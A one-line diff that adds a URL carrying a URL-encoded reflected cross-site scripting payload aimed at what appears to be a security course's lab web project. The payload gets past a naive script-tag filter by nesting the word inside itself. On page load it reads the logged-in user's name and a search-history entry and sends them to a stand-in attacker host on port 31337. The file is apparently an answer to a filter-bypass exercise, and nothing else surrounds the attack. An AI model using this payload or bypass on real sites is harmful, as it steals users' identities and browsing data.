@@ -1,0 +1,1 @@
+https://webproject.gtinfosec.org/search?xssdefense=1&q=%3Csscriptcript%3E%24(document).ready(function%20()%20%7B%24.get(%27http%3A%2F%2Fstealer%3A31337%2F%3Fstolen_user%3D%27%2Bdocument.getElementById(%27logged-in-user%27).innerHTML%2B%27%26last_search%3D%27%2Bdocument.getElementById(%27history-list%27).children%5B1%5D.text)%3B%7D)%3B%3C%2Fsscriptcript%3E%0A
